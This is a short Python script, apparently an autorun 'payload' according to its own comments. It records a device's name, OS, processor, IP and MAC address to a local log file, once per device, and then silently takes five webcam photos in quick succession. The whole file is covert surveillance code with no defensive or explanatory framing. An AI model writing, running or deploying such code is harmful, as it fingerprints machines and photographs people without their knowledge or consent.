import platform
import socket
import uuid
import cv2
import os
import time
from datetime import datetime

# Set file paths
info_file = "device_info_log.txt"

def get_device_info():
    """Collects device and system information."""
    info = {
        "Device Name": platform.node(),
        "System": platform.system(),
        "System Version": platform.version(),
        "Processor": platform.processor(),
        "Machine": platform.machine(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                for elements in range(0,2*6,2)][::-1])
    }
    return info

def capture_images(image_count=5, interval=0.2):
    """Captures multiple images from the camera with a time interval."""
    try:
        camera = cv2.VideoCapture(0)
        for i in range(image_count):
            ret, frame = camera.read()
            if ret:
                image_file = f"captured_image_{i+1}.jpg"
                cv2.imwrite(image_file, frame)
                print(f"Image {i+1} captured and saved as {image_file}")
            else:
                print("Failed to capture image.")
            time.sleep(interval)  # Wait for specified interval before the next capture
        camera.release()
        cv2.destroyAllWindows()
    except Exception as e:
        print(f"Error accessing camera: {e}")

def log_info(info, filename=info_file):
    """Logs device info to a file only if it is not already present."""
    device_id = info["MAC Address"]
    try:
        # Check if the device info is already logged
        if os.path.exists(filename):
            with open(filename, "r") as file:
                content = file.read()
                if device_id in content:
                    print("Device info already logged. Skipping entry.")
                    return False  # Indicates that an entry already exists
        
        # Log new device info if no entry is found
        with open(filename, "a") as file:
            file.write(f"\n\n--- Device Info Logged at {datetime.now()} ---\n")
            for key, value in info.items():
                file.write(f"{key}: {value}\n")
            print(f"Device info written to {filename}.")
        return True  # Indicates that a new entry was added
    except Exception as e:
        print(f"Error logging info: {e}")
        return False

def main():
    device_info = get_device_info()
    entry_added = log_info(device_info)
    
    # Capture images regardless of manual or autorun execution
    #print("Capturing 5 images with 0.2-second intervals.")
    capture_images(image_count=5, interval=0.2)

# Run the payload
if __name__ == "__main__":
    main()